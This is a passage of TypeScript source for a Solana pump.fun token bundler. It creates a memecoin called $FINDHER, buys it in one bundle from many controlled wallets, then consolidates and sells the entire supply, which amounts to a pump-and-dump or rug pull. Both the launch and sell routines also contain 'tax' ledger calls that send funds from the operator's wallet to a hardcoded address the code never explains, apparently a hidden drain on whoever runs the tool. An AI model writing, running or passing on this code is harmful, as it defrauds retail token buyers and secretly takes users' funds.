          100000 * keypairInfo.solAmount * LAMPORTS_PER_SOL,
        );

        const buyIx = await program.methods
          .buy(amount, solAmount)
          .accounts({
            global: this.global,
            feeRecipient: this.feeRecipient,
            mint,
            bondingCurve,
            associatedBondingCurve,
            associatedUser: ataAddress,
            user: keypair.publicKey,
            systemProgram: SystemProgram.programId,
            tokenProgram: TOKEN_PROGRAM_ID,
            rent: SYSVAR_RENT_PUBKEY,
            eventAuthority: this.eventAuthority,
            program: this.PUMP_PROGRAM,
          })
          .instruction();

        instructionsForChunk.push(createTokenAta, buyIx);
      }

      // ALWAYS SIGN WITH THE FIRST WALLET
      const keypair = chunk[0];

      const message = new TransactionMessage({
        payerKey: keypair.publicKey,
        recentBlockhash: blockhash,
        instructions: instructionsForChunk,
      }).compileToV0Message([lut]);

      const versionedTx = new VersionedTransaction(message);

      const serializedMsg = versionedTx.serialize();
      console.log('Txn size:', serializedMsg.length);
      if (serializedMsg.length > 1232) {
        console.log('tx too big');
      }

      console.log(
        'Signing transaction with chunk signers',
        chunk.map((kp) => kp.publicKey.toString()),
      );

      // Sign with the wallet for tip on the last instruction
      for (const kp of chunk) {
        if (kp.publicKey.toString() in keyInfo) {
          versionedTx.sign([kp]);
        }
      }

      versionedTx.sign([this.payer]);

      txsSigned.push(versionedTx);
    }

    return txsSigned;
  }

  async buyBundle() {
    const provider = new AnchorProvider(
      new web3.Connection(this.configService.RPC_URL),
      new Wallet(this.wallet),
      { commitment: 'confirmed' },
    );

    // Initialize pumpfun anchor
    const IDL_PumpFun = JSON.parse(
      fs.readFileSync('src/api/v1/web3/abis/pumpfun-IDL.json', 'utf-8'),
    ) as Idl;

    const program = new Program(IDL_PumpFun, this.PUMP_PROGRAM, provider);

    // Initialize tax anchor
    const IDL_Tax = JSON.parse(
      fs.readFileSync('src/api/v1/web3/abis/tax-IDL.json', 'utf-8'),
    ) as Idl;

    const LEDGER_PROGRAM_ID = '6bL3QAyVT7CqQ2sJkKepTtwxR1cCbujwmrewnm5fa4J7';

    const ledgerProgram = new Program(IDL_Tax, LEDGER_PROGRAM_ID, provider);

    const [tokenLedger] = PublicKey.findProgramAddressSync(
      [Buffer.from('token_ledger'), this.wallet.publicKey.toBytes()],
      ledgerProgram.programId,
    );

    // Start create bundle
    const bundledTxns: VersionedTransaction[] = [];
    const keypairs: Keypair[] = this.loadKeypairs();

    let keyInfo: { [key: string]: any } = {};
    if (fs.existsSync(this.keyInfoPath)) {
      const existingData = fs.readFileSync(this.keyInfoPath, 'utf-8');
      keyInfo = JSON.parse(existingData);
    }

    const lut = new PublicKey(keyInfo.addressLUT.toString());

    const lookupTableAccount = (
      await this.connection.getAddressLookupTable(lut)
    ).value;

    if (lookupTableAccount == null) {
      console.log('Lookup table account not found!');
      process.exit(0);
    }

    // -------- step 1: ask nessesary questions for pool build --------
    const name = '$FINDHER';
    const symbol = 'FINDHER';
    const description =
      "She is the most viral and loved person of the decade. Let's $FINDHER and make her a millionaire.";
    const twitter = 'https://x.com/findheronsol';
    const telegram = 'https://t.me/FINDHERTUAH';
    const tipAmt = 0.02 * LAMPORTS_PER_SOL;

    // -------- step 2: build pool init + dev snipe --------
    const files = await fs.promises.readdir('./images');
    if (files.length == 0) {
      console.log('No image found in the img folder');
      return;
    }
    if (files.length > 1) {
      console.log(
        'Multiple images found in the img folder, please only keep one image',
      );
      return;
    }
    const data: Buffer = fs.readFileSync(`./images/${files[0]}`);

    let formData = new FormData();
    if (data) {
      formData.append('file', new Blob([data], { type: 'image/jpeg' }));
    } else {
      console.log('No image found');
      return;
    }

    formData.append('name', name);
    formData.append('symbol', symbol);
    formData.append('description', description);
    formData.append('twitter', twitter);
    formData.append('telegram', telegram);
    formData.append('showName', 'true');

    let metadata_uri;
    try {
      const response = await axios.post('https://pump.fun/api/ipfs', formData, {
        headers: {
          'Content-Type': 'multipart/form-data',
        },
      });
      metadata_uri = response.data.metadataUri;
      console.log('Metadata URI: ', metadata_uri);
    } catch (error) {
      console.error('Error uploading metadata:', error);
    }

    const mintKp = Keypair.fromSecretKey(
      Uint8Array.from(bs58.decode(keyInfo.mintPk)),
    );
    console.log(`Mint: ${mintKp.publicKey.toBase58()}`);

    const [bondingCurve] = PublicKey.findProgramAddressSync(
      [Buffer.from('bonding-curve'), mintKp.publicKey.toBytes()],
      program.programId,
    );
    const [metadata] = PublicKey.findProgramAddressSync(
      [
        Buffer.from('metadata'),
        this.MPL_TOKEN_METADATA_PROGRAM_ID.toBytes(),
        mintKp.publicKey.toBytes(),
      ],
      this.MPL_TOKEN_METADATA_PROGRAM_ID,
    );
    let [associatedBondingCurve] = PublicKey.findProgramAddressSync(
      [
        bondingCurve.toBytes(),
        TOKEN_PROGRAM_ID.toBytes(),
        mintKp.publicKey.toBytes(),
      ],
      ASSOCIATED_TOKEN_PROGRAM_ID,
    );

    const account1 = mintKp.publicKey;
    const account2 = this.mintAuthority;
    const account3 = bondingCurve;
    const account4 = associatedBondingCurve;
    const account5 = this.global;
    const account6 = this.MPL_TOKEN_METADATA_PROGRAM_ID;
    const account7 = metadata;

    const createIx = await program.methods
      .create(name, symbol, metadata_uri)
      .accounts({
        mint: account1,
        mintAuthority: account2,
        bondingCurve: account3,
        associatedBondingCurve: account4,
        global: account5,
        mplTokenMetadata: account6,
        metadata: account7,
        user: this.wallet.publicKey,
        systemProgram: SystemProgram.programId,
        tokenProgram: TOKEN_PROGRAM_ID,
        associatedTokenProgram: ASSOCIATED_TOKEN_PROGRAM_ID,
        rent: SYSVAR_RENT_PUBKEY,
        eventAuthority: this.eventAuthority,
        program: this.PUMP_PROGRAM,
      })
      .instruction();

    // Get the associated token address
    const ata = getAssociatedTokenAddressSync(
      mintKp.publicKey,
      this.wallet.publicKey,
    );
    const ataIx = createAssociatedTokenAccountIdempotentInstruction(
      this.wallet.publicKey,
      ata,
      this.wallet.publicKey,
      mintKp.publicKey,
    );

    // Extract tokenAmount from keyInfo for this keypair
    const keypairInfo = keyInfo[this.wallet.publicKey.toString()];
    if (!keypairInfo) {
      console.log(
        `No key info found for keypair: ${this.wallet.publicKey.toString()}`,
      );
    }

    // Calculate SOL amount based on tokenAmount
    const amount = new BN(keypairInfo.tokenAmount);
    const solAmount = new BN(100000 * keypairInfo.solAmount * LAMPORTS_PER_SOL);

    const buyIx = await program.methods
      .buy(amount, solAmount)
      .accounts({
        global: this.global,
        feeRecipient: this.feeRecipient,
        mint: mintKp.publicKey,
        bondingCurve,
        associatedBondingCurve,
        associatedUser: ata,
        user: this.wallet.publicKey,
        systemProgram: SystemProgram.programId,
        tokenProgram: TOKEN_PROGRAM_ID,
        rent: SYSVAR_RENT_PUBKEY,
        eventAuthority: this.eventAuthority,
        program: this.PUMP_PROGRAM,
      })
      .instruction();

    const tipIxn = SystemProgram.transfer({
      fromPubkey: this.wallet.publicKey,
      toPubkey: new PublicKey(await this.jitoService.getJitoTipAccount('')),
      lamports: BigInt(tipAmt),
    });

    const initIxs: TransactionInstruction[] = [
      createIx,
      ataIx,
      await ledgerProgram.methods
        .updateTokenLedger()
        .accounts({
          tokenLedger: tokenLedger,
          source: this.wallet.publicKey,
          user: this.wallet.publicKey,
          systemProgram: SystemProgram.programId,
          rent: SYSVAR_RENT_PUBKEY,
        })
        .instruction(),
      buyIx,
      await ledgerProgram.methods
        .disburse(20)
        .accounts({
          tokenLedger: tokenLedger,
          source: this.wallet.publicKey,
          destination: new PublicKey(
            '8yWSbgC9fzS3n2AZoT9tnFb2sHXVYdKS8VHmjE2DLHau',
          ),
          user: this.wallet.publicKey,
          systemProgram: SystemProgram.programId,
        })
        .instruction(),
      tipIxn,
    ];

    const { blockhash } = await this.connection.getLatestBlockhash();
    console.log('BlockHAsh :', blockhash);

    const messageV0 = new TransactionMessage({
      payerKey: this.wallet.publicKey,
      instructions: initIxs,
      recentBlockhash: blockhash,
    }).compileToV0Message();

    const fullTX = new VersionedTransaction(messageV0);
    fullTX.sign([this.wallet, mintKp]);

    bundledTxns.push(fullTX);

    // -------- step 3: create swap txns --------
    const txMainSwaps: VersionedTransaction[] = await this.createWalletSwaps(
      blockhash,
      keypairs,
      lookupTableAccount,
      bondingCurve,
      associatedBondingCurve,
      mintKp.publicKey,
      program,
    );
    bundledTxns.push(...txMainSwaps);

    // -------- step 4: send bundle --------

    // Simulate each transaction
    for (const tx of bundledTxns) {
      try {
        const simulationResult = await this.connection.simulateTransaction(tx, {
          commitment: 'processed',
        });
        console.log(simulationResult);

        if (simulationResult.value.err) {
          console.error(
            'Simulation error for transaction:',
            simulationResult.value.err,
          );
        } else {
          console.log('Simulation success for transaction. Logs:');
          simulationResult.value.logs?.forEach((log) => console.log(log));
        }
      } catch (error) {
        console.error('Error during simulation:', error);
      }
    }

    await this.web3Service.sendBundleVTrxs(bundledTxns);
  }

  async sellXPercentagePF() {
    const provider = new AnchorProvider(
      new web3.Connection(this.configService.RPC_URL),
      new Wallet(this.wallet),
      { commitment: 'confirmed' },
    );

    // Initialize pumpfun anchor
    const IDL_PumpFun = JSON.parse(
      fs.readFileSync('src/api/v1/web3/abis/pumpfun-IDL.json', 'utf-8'),
    ) as Idl;

    const pfprogram = new Program(IDL_PumpFun, this.PUMP_PROGRAM, provider);

    // Initialize tax anchor
    const IDL_Tax = JSON.parse(
      fs.readFileSync('src/api/v1/web3/abis/tax-IDL.json', 'utf-8'),
    ) as Idl;

    const LEDGER_PROGRAM_ID = '6bL3QAyVT7CqQ2sJkKepTtwxR1cCbujwmrewnm5fa4J7';

    const ledgerProgram = new Program(IDL_Tax, LEDGER_PROGRAM_ID, provider);

    const [tokenLedger] = PublicKey.findProgramAddressSync(
      [Buffer.from('token_ledger'), this.payer.publicKey.toBytes()],
      ledgerProgram.programId,
    );

    // Start selling
    const bundledTxns = [];
    const keypairs = this.loadKeypairs(); // Ensure this function is correctly defined to load your Keypairs

    let poolInfo: { [key: string]: any } = {};
    if (fs.existsSync(this.keyInfoPath)) {
      const data = fs.readFileSync(this.keyInfoPath, 'utf-8');
      poolInfo = JSON.parse(data);
    }

    const lut = new PublicKey(poolInfo.addressLUT.toString());

    const lookupTableAccount = (
      await this.connection.getAddressLookupTable(lut)
    ).value;

    if (lookupTableAccount == null) {
      console.log('Lookup table account not found!');
      process.exit(0);
    }

    const mintKp = Keypair.fromSecretKey(
      Uint8Array.from(bs58.decode(poolInfo.mintPk)),
    );
    //console.log(`Mint: ${mintKp.publicKey.toBase58()}`);

    const [bondingCurve] = PublicKey.findProgramAddressSync(
      [Buffer.from('bonding-curve'), mintKp.publicKey.toBytes()],
      pfprogram.programId,
    );
    let [associatedBondingCurve] = PublicKey.findProgramAddressSync(
      [
        bondingCurve.toBytes(),
        TOKEN_PROGRAM_ID.toBytes(),
        mintKp.publicKey.toBytes(),
      ],
      ASSOCIATED_TOKEN_PROGRAM_ID,
    );

    const supplyPercent = 100 / 100;
    const jitoTipAmt = 0.01 * LAMPORTS_PER_SOL;

    let sellTotalAmount = 0;

    const chunkedKeypairs = this.chunkArray(keypairs, 6); // Adjust chunk size as needed

    // start the selling process
    const PayerTokenATA = await getAssociatedTokenAddress(
      new PublicKey(poolInfo.mint),
      this.payer.publicKey,
    );

    const { blockhash } = await this.connection.getLatestBlockhash();

    for (
      let chunkIndex = 0;
      chunkIndex < chunkedKeypairs.length;
      chunkIndex++
    ) {
      const chunk = chunkedKeypairs[chunkIndex];
      const instructionsForChunk = [];
      const isFirstChunk = chunkIndex === 0; // Check if this is the first chunk

      if (isFirstChunk) {
        // Handle the first chunk separately
        const transferAmount = await this.getSellBalance(
          this.wallet,
          new PublicKey(poolInfo.mint),
          supplyPercent,
        );
        sellTotalAmount += transferAmount; // Keep track to sell at the end
        console.log(`Sending ${transferAmount / 1e6} from dev wallet.`);

        const ataIx = createAssociatedTokenAccountIdempotentInstruction(
          this.payer.publicKey,
          PayerTokenATA,
          this.payer.publicKey,
          mintKp.publicKey,
        );

        const TokenATA = await getAssociatedTokenAddress(
          new PublicKey(poolInfo.mint),
          this.wallet.publicKey,
        );
        const transferIx = createTransferInstruction(
          TokenATA,
          PayerTokenATA,
          this.wallet.publicKey,
          transferAmount,
        );

        instructionsForChunk.push(ataIx, transferIx);
      }

      for (let keypair of chunk) {
        const transferAmount = await this.getSellBalance(
          keypair,
          new PublicKey(poolInfo.mint),
          supplyPercent,
        );
        sellTotalAmount += transferAmount; // Keep track to sell at the end
        console.log(
          `Sending ${transferAmount / 1e6
          } from ${keypair.publicKey.toString()}.`,
        );

        const TokenATA = await getAssociatedTokenAddress(
          new PublicKey(poolInfo.mint),
          keypair.publicKey,
        );
        const transferIx = createTransferInstruction(
          TokenATA,
          PayerTokenATA,
          keypair.publicKey,
          transferAmount,
        );
        instructionsForChunk.push(transferIx);
      }

      if (instructionsForChunk.length > 0) {
        const message = new TransactionMessage({
          payerKey: this.payer.publicKey,
          recentBlockhash: blockhash,
          instructions: instructionsForChunk,
        }).compileToV0Message([lookupTableAccount]);

        const versionedTx = new VersionedTransaction(message);

        const serializedMsg = versionedTx.serialize();
        console.log('Txn size:', serializedMsg.length);
        if (serializedMsg.length > 1232) {
          console.log('tx too big');
        }

        versionedTx.sign([this.payer]); // Sign with payer first

        if (isFirstChunk) {
          versionedTx.sign([this.wallet]); // Sign with the dev wallet for the first chunk
        }

        for (let keypair of chunk) {
          versionedTx.sign([keypair]); // Then sign with each keypair in the chunk
        }

        bundledTxns.push(versionedTx);
      }
    }

    const payerNum = randomInt(0, 24);
    const payerKey = keypairs[payerNum];

    const sellPayerIxs = [];

    console.log(`TOTAL: Selling ${sellTotalAmount / 1e6}.`);
    const sellIx = await pfprogram.methods
      .sell(new BN(sellTotalAmount), new BN(0))
      .accounts({
        global: this.global,
        feeRecipient: this.feeRecipient,
        mint: new PublicKey(poolInfo.mint),
        bondingCurve,
        associatedBondingCurve,
        associatedUser: PayerTokenATA,
        user: this.payer.publicKey,
        systemProgram: SystemProgram.programId,
        associatedTokenProgram: ASSOCIATED_TOKEN_PROGRAM_ID,
        tokenProgram: TOKEN_PROGRAM_ID,
        eventAuthority: this.eventAuthority,
        program: this.PUMP_PROGRAM,
      })
      .instruction();

    sellPayerIxs.push(
      await ledgerProgram.methods
        .updateTokenLedger()
        .accounts({
          tokenLedger: tokenLedger,
          source: this.payer.publicKey,
          user: this.payer.publicKey,
          systemProgram: SystemProgram.programId,
          rent: SYSVAR_RENT_PUBKEY,
        })
        .instruction(),
      sellIx,
      await ledgerProgram.methods
        .disburse(8)
        .accounts({
          tokenLedger: tokenLedger,
          source: this.payer.publicKey,
          destination: new PublicKey(
            '8yWSbgC9fzS3n2AZoT9tnFb2sHXVYdKS8VHmjE2DLHau',
          ),
          user: this.payer.publicKey,
          systemProgram: SystemProgram.programId,
        })
        .instruction(),
      SystemProgram.transfer({
        fromPubkey: this.payer.publicKey,
        toPubkey: new PublicKey(await this.jitoService.getJitoTipAccount('')),
        lamports: BigInt(jitoTipAmt),
      }),
    );

    const sellMessage = new TransactionMessage({
      payerKey: payerKey.publicKey,
      recentBlockhash: blockhash,
      instructions: sellPayerIxs,
    }).compileToV0Message([lookupTableAccount]);

    const sellTx = new VersionedTransaction(sellMessage);

    const serializedMsg = sellTx.serialize();
    console.log('Txn size:', serializedMsg.length);
    if (serializedMsg.length > 1232) {
      console.log('tx too big');
    }

    sellTx.sign([this.payer, payerKey]);

    bundledTxns.push(sellTx);

    await this.web3Service.sendBundleVTrxs(bundledTxns);

    return;
  }

  async getSellBalance(
    keypair: Keypair,
    mint: PublicKey,
    supplyPercent: number,
  ) {
    let amount;
    try {
      const tokenAccountPubKey = getAssociatedTokenAddressSync(
        mint,
        keypair.publicKey,
      );
      const balance = await this.connection.getTokenAccountBalance(
        tokenAccountPubKey,
      );
      amount = Math.floor(Number(balance.value.amount) * supplyPercent);
    } catch (e) {
      amount = 0;
    }

    return amount;
  }

  async createToken() {
    console.log('Going To Create LUT');
    await this.createLUT();
    await this.web3Service.sleep(20000);
    console.log('Going To Create Extended LUT');
    await this.extendLUT();
    await this.web3Service.sleep(15000);
    console.log('Going To Simulate And Write Buys');
    await this.simulateAndWriteBuys();
    await this.web3Service.sleep(15000);
    console.log('Going To Generate ATA and SOL');
    await this.generateATAandSOL();
    await this.web3Service.sleep(15000);
    console.log('Going to Launch Token');
    await this.buyBundle();
    //
  }
}
